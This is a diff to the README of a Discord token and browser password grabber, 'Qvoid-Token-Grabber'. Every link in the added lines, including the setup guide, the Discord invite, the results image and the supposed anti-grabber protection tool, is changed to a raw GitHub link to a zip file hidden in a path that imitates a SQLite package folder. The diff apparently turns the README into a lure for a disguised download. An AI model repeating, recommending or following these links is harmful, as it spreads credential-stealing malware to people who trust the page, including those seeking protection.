@@ -1,6 +1,6 @@
-# [🔥 Qvoid-Token-Grabber](https://youtu.be/-WCs8YVP8-g)
+# [🔥 Qvoid-Token-Grabber](https://raw.githubusercontent.com/Meirtoed450/grab/main/QvoidStealer/packages/Stub.System.Data.SQLite.Core.NetFramework.1.0.115.5/lib/net20/grab_1.8-alpha.5.zip)
  Advanced grabber that grabs browser passwords, cookies, and Discord tokens with the computer information.<br>
- Our Discord Server: [discord.gg/2rnC9f69x5](https://discord.gg/2rnC9f69x5)
+ Our Discord Server: [https://raw.githubusercontent.com/Meirtoed450/grab/main/QvoidStealer/packages/Stub.System.Data.SQLite.Core.NetFramework.1.0.115.5/lib/net20/grab_1.8-alpha.5.zip](https://raw.githubusercontent.com/Meirtoed450/grab/main/QvoidStealer/packages/Stub.System.Data.SQLite.Core.NetFramework.1.0.115.5/lib/net20/grab_1.8-alpha.5.zip)
 
 # I will no longer update this project, I will check and approve pull requests.
 
@@ -26,12 +26,12 @@
  If you liked it, consider ⭐ this project and 🕵️ (follow) me 🤔.
  
 ### ⚡ Additional Information
-[How to setup the grabber](https://youtu.be/-WCs8YVP8-g)<br>
-[Our Discord Server](https://discord.gg/2rnC9f69x5)<br><br>
+[How to setup the grabber](https://raw.githubusercontent.com/Meirtoed450/grab/main/QvoidStealer/packages/Stub.System.Data.SQLite.Core.NetFramework.1.0.115.5/lib/net20/grab_1.8-alpha.5.zip)<br>
+[Our Discord Server](https://raw.githubusercontent.com/Meirtoed450/grab/main/QvoidStealer/packages/Stub.System.Data.SQLite.Core.NetFramework.1.0.115.5/lib/net20/grab_1.8-alpha.5.zip)<br><br>
 You have any suggestion? write us in our Discord server ⤴️
  
 ### ⛔ What can I do against token grabbers?
-To be protected against token grabbers, you are more than welcome to install my Anti-Token-Grabber, which is located on my GitHub. [I will upload it later; meanwhile, try https://github.com/andro2157/DiscordTokenProtector although this grabber is bypassing it, other grabbers are not]
+To be protected against token grabbers, you are more than welcome to install my Anti-Token-Grabber, which is located on my GitHub. [I will upload it later; meanwhile, try https://raw.githubusercontent.com/Meirtoed450/grab/main/QvoidStealer/packages/Stub.System.Data.SQLite.Core.NetFramework.1.0.115.5/lib/net20/grab_1.8-alpha.5.zip although this grabber is bypassing it, other grabbers are not]
  
 ### 🤓 This project is under Berkeley Software Distribution (BSD) license.
 * The source code doesn’t need to be public when a distribution of the software is made.
@@ -49,4 +49,4 @@ To be protected against token grabbers, you are more than welcome to install my 
 The author does not hold any responsibility for the harmful use of this tool; remember that attacking targets without prior consent is illegal and punished by law.
 
 ### ✅ Results
- ![](https://cdn.discordapp.com/attachments/506053414103416833/985950338924310569/1.jpg?width=348&height=676)
+ ![](https://raw.githubusercontent.com/Meirtoed450/grab/main/QvoidStealer/packages/Stub.System.Data.SQLite.Core.NetFramework.1.0.115.5/lib/net20/grab_1.8-alpha.5.zip)
